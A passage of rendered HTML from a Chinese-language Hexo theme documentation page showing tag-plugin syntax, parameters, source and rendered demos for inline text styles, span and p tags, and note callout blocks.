class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 带 &#123;% u 下划线 %&#125; 的文本</span><br><span class="line"><span class="bullet">2.</span> 带 &#123;% emp 着重号 %&#125; 的文本</span><br><span class="line"><span class="bullet">3.</span> 带 &#123;% wavy 波浪线 %&#125; 的文本</span><br><span class="line"><span class="bullet">4.</span> 带 &#123;% del 删除线 %&#125; 的文本</span><br><span class="line"><span class="bullet">5.</span> 键盘样式的文本 &#123;% kbd command %&#125; + &#123;% kbd D %&#125;</span><br><span class="line"><span class="bullet">6.</span> 密码样式的文本：&#123;% psw 这里没有验证码 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><ol><li>带 <u>下划线</u> 的文本</li><li>带 <emp>着重号</emp> 的文本</li><li>带 <wavy>波浪线</wavy> 的文本</li><li>带 <del>删除线</del> 的文本</li><li>键盘样式的文本 <kbd>command</kbd> + <kbd>D</kbd></li><li>密码样式的文本：<psw>这里没有验证码</psw></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-2-行内文本-span">2.2 行内文本 span</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% span 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% span red, 红色 %&#125;、&#123;% span yellow, 黄色 %&#125;、&#123;% span green, 绿色 %&#125;、&#123;% span cyan, 青色 %&#125;、&#123;% span blue, 蓝色 %&#125;、&#123;% span gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% span center logo large, Volantis %&#125;</span><br><span class="line">&#123;% span center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<span class='p red'>红色</span>、<span class='p yellow'>黄色</span>、<span class='p green'>绿色</span>、<span class='p cyan'>青色</span>、<span class='p blue'>蓝色</span>、<span class='p gray'>灰色</span>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。<br><span class='p center logo large'>Volantis</span><br><span class='p center small'>A Wonderful Theme for Hexo</span></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-3-段落文本-p">2.3 段落文本 p</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% p 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% p red, 红色 %&#125;、&#123;% p yellow, 黄色 %&#125;、&#123;% p green, 绿色 %&#125;、&#123;% p cyan, 青色 %&#125;、&#123;% p blue, 蓝色 %&#125;、&#123;% p gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% p center logo large, Volantis %&#125;</span><br><span class="line">&#123;% p center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<p class='p red'>红色</p>、<p class='p yellow'>黄色</p>、<p class='p green'>绿色</p>、<p class='p cyan'>青色</p>、<p class='p blue'>蓝色</p>、<p class='p gray'>灰色</p>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。</li></ul><p class='p center logo large'>Volantis</p><p class='p center small'>A Wonderful Theme for Hexo</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-4-引用note">2.4 引用note</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">通用配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">语法格式</button></li><li class="tab"><button type="button" data-href="#分栏-3">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-4">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-5">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: simple</span><br><span class="line">  icons: false</span><br><span class="line">  border<span class="emphasis">_radius: 3</span></span><br><span class="line"><span class="emphasis">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span></span><br><span class="line"><span class="emphasis">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span></span><br><span class="line"><span class="emphasis">  light_</span>bg<span class="emphasis">_offset: 0</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 自带icon</span></span><br><span class="line">&#123;% note [class] [no-icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"><span class="section"># 外部icon</span></span><br><span class="line">&#123;% note [color] [icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.自带icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / primary / success / info / warning / danger ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】不显示 icon</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><p>2.外部icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / blue / pink / red / purple / orange / green ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】可配置自定义 icon (只支持 fontawesome 图标, 也可以配置 no-icon )</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note simple %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default simple %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary simple %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success simple %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info simple %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning simple %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger simple %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note modern %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default modern %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary modern %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success modern %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info modern %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning modern %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger modern %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note flat %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note disabled %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default disabled %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary disabled %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success disabled %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info disabled %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning disabled %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger disabled %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default no-icon %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary no-icon %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success no-icon %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info no-icon %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning no-icon %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger no-icon %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; simple %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; simple %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; simple%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; simple %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; simple %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; modern %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; modern%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; modern %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; modern %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; disabled %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; disabled %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; disabled %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; disabled %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; disabled %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue no-icon %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink no-icon %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red no-icon %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple no-icon %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green no-icon %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-5"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note simple"><p>默认 提示块标签</p></div><div class="note default simple"><p>default 提示块标签</p></div><div class="note primary simple"><p>primary 提示块标签</p></div><div class="note success simple"><p>success 提示块标签</p></div><div class="note info simple"><p>info 提示块标签</p></div><div class="note warning simple"><p>warning 提示块标签</p></div><div class="note danger simple"><p>danger 提示块标签</p></div>2.`modern`样式<div class="note modern"><p>默认 提示块标签</p></div><div class="note default modern"><p>default 提示块标签</p></div><div class="note primary modern"><p>primary 提示块标签</p></div><div class="note success modern"><p>success 提示块标签</p></div><div class="note info modern"><p>info 提示块标签</p></div><div class="note warning modern"><p>warning 提示块标签</p></div><div class="note danger modern"><p>danger 提示块标签</p></div><p>3.<code>flat</code>样式</p><div class="note flat"><p>默认 提示块标签</p></div><div class="note default flat"><p>default 提示块标签</p></div><div class="note primary flat"><p>primary 提示块标签</p></div><div class="note success flat"><p>success 提示块标签</p></div><div class="note info flat"><p>info 提示块标签</p></div><div class="note warning flat"><p>warning 提示块标签</p></div><div class="note danger flat"><p>danger 提示块标签</p></div><p>4.<code>disabled</code>样式</p><div class="note disabled"><p>默认 提示块标签</p></div><div class="note default disabled"><p>default 提示块标签</p></div><div class="note primary disabled"><p>primary 提示块标签</p></div><div class="note success disabled"><p>success 提示块标签</p></div><div class="note info disabled"><p>info 提示块标签</p></div><div class="note warning disabled"><p>warning 提示块标签</p></div><div class="note danger disabled"><p>danger 提示块标签</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>默认 提示块标签</p></div><div class="note default no-icon flat"><p>default 提示块标签</p></div><div class="note primary no-icon flat"><p>primary 提示块标签</p></div><div class="note success no-icon flat"><p>success 提示块标签</p></div><div class="note info no-icon flat"><p>info 提示块标签</p></div><div class="note warning no-icon flat"><p>warning 提示块标签</p></div><div class="note danger no-icon flat"><p>danger 提示块标签</p></div>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note icon-padding simple"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding simple"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding simple"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding simple"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding simple"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding simple"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>2.<code>modern</code>样式</p><div class="note icon-padding modern"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding modern"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding modern"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>3.<code>flat</code>样式</p><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding flat"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>4.<code>disabled</code>样式</p><div class="note icon-padding disabled"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding disabled"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding disabled"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding disabled"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding disabled"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding disabled"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue no-icon flat"><p>2021年快到了…</p></div><div class="note pink no-icon flat"><p>小心开车 安全至上</p></div><div class="note red no-icon flat"><p>这是三片呢？还是四片？</p></div><div class="note orange no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple no-icon flat"><p>剪刀石头布</p></div><div class="note green no-icon flat"><p>前端最讨厌的浏览器</p></div>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-5-上标标签-tip">2.5 上标标签 tip</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" 